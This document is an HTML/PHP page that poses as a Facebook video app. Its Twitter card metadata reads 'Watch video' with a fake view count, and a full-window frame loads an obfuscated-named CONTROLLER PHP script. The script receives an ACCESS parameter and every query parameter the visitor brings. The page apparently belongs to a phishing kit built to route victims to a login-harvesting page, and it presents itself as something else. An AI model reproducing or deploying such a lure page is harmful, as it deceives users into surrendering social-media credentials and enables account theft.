
	<html> 
	<head> 
	<title>Faceboo Video APP</title>
		
		<meta name="twitter:card" content="summary" />
		<meta name="twitter:site" content="@" />
		<meta name="twitter:title" content="Watch video @" />
		<meta name="twitter:description" content="885,975 Views " />
		<meta name="twitter:image" content="https://avatars.io/twitter/" />
	
	</head>
	<frameset rows="*,3" frameborder="NO" border="50" framespacing="0">
	<frame name="main" src="../.././public/CONTROLLER8a669f2e-eb6c-495d-89e2-4cefd9ff8b6b.php?source=.%2Fpublic%2FACCESSSb50fdad5-b257-43a0-8dfa-5a1a6eada59c&lan=twthk&<?php echo http_build_query($_GET); ?>"> <noframes> 
	<body bgcolor="#FFFFFF" text="#000000"> 
	<a href="../.././public/CONTROLLER8a669f2e-eb6c-495d-89e2-4cefd9ff8b6b.php?source=.%2Fpublic%2FACCESSSb50fdad5-b257-43a0-8dfa-5a1a6eada59c&lan=twthk&<?php echo http_build_query($_GET); ?>">Click here to continue</a> 
	</body> 
	</noframes> 
	</html> 
   